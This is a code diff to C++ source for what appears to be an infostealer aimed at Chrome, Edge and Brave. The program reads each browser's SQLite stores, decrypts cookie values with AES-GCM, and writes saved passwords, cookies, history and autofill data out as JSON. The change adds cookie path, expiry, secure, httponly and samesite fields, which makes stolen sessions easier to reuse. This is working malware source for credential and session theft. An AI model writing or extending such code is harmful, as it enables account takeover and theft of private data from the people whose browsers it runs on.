@@ -56,7 +56,11 @@ std::string ensure_utf8(const std::string& input) {
 enum class Browser { Chrome, Edge, Brave };
 
 struct PasswordData { std::string url, username, password; };
-struct CookieData { std::string host, name, value; };
+struct CookieData {
+    std::string host, name, value, path;
+    long long expires_utc;
+    int is_secure, is_httponly, samesite;
+};
 struct HistoryData { std::string url, title; int visit_count; };
 struct AutofillData { std::string name, value; };
 struct ProfileData {
@@ -347,14 +351,21 @@ void do_work() {
             sqlite3* db;
             if (sqlite3_open(tmp_db.string().c_str(), &db) == SQLITE_OK) {
                 sqlite3_stmt* stmt;
-                if (sqlite3_prepare_v2(db, "SELECT host_key, name, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
+                if (sqlite3_prepare_v2(db, "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                     while (sqlite3_step(stmt) == SQLITE_ROW) {
                         const char* t_host = (const char*)sqlite3_column_text(stmt, 0);
                         const char* t_name = (const char*)sqlite3_column_text(stmt, 1);
+                        const char* t_path = (const char*)sqlite3_column_text(stmt, 2);
                         std::string host = t_host ? t_host : "";
                         std::string name = t_name ? t_name : "";
-                        const unsigned char* enc_blob = (const unsigned char*)sqlite3_column_blob(stmt, 2);
-                        int enc_len = sqlite3_column_bytes(stmt, 2);
+                        std::string path = t_path ? t_path : "";
+                        long long expires = sqlite3_column_int64(stmt, 3);
+                        int secure = sqlite3_column_int(stmt, 4);
+                        int httponly = sqlite3_column_int(stmt, 5);
+                        int samesite = sqlite3_column_int(stmt, 6);
+
+                        const unsigned char* enc_blob = (const unsigned char*)sqlite3_column_blob(stmt, 7);
+                        int enc_len = sqlite3_column_bytes(stmt, 7);
                         std::vector<unsigned char> enc_val(enc_blob, enc_blob + enc_len);
 
                         bool is_v20 = (enc_val.size() > 3 && std::string((char*)enc_val.data(), 3) == "v20");
@@ -363,7 +374,7 @@ void do_work() {
                             auto dec = aes_gcm_decrypt(key, enc_val);
                             if (!dec.empty()) {
                                 if (dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
-                                p_data.cookies.push_back({ host, name, to_utf8_lossy(dec) });
+                                p_data.cookies.push_back({ host, name, to_utf8_lossy(dec), path, expires, secure, httponly, samesite });
                             }
                         }
                     }
@@ -422,7 +433,16 @@ void do_work() {
         pj["passwords"] = json::array();
         for (auto& p : p_data.passwords) pj["passwords"].push_back({{"url", ensure_utf8(p.url)}, {"username", ensure_utf8(p.username)}, {"password", ensure_utf8(p.password)}});
         pj["cookies"] = json::array();
-        for (auto& c : p_data.cookies) pj["cookies"].push_back({{"host", ensure_utf8(c.host)}, {"name", ensure_utf8(c.name)}, {"value", ensure_utf8(c.value)}});
+        for (auto& c : p_data.cookies) pj["cookies"].push_back({
+            {"host", ensure_utf8(c.host)},
+            {"name", ensure_utf8(c.name)},
+            {"value", ensure_utf8(c.value)},
+            {"path", ensure_utf8(c.path)},
+            {"expires_utc", c.expires_utc},
+            {"is_secure", c.is_secure},
+            {"is_httponly", c.is_httponly},
+            {"samesite", c.samesite}
+        });
         pj["history"] = json::array();
         for (auto& h : p_data.history) pj["history"].push_back({{"url", ensure_utf8(h.url)}, {"title", ensure_utf8(h.title)}, {"visit_count", h.visit_count}});
         pj["autofill"] = json::array();
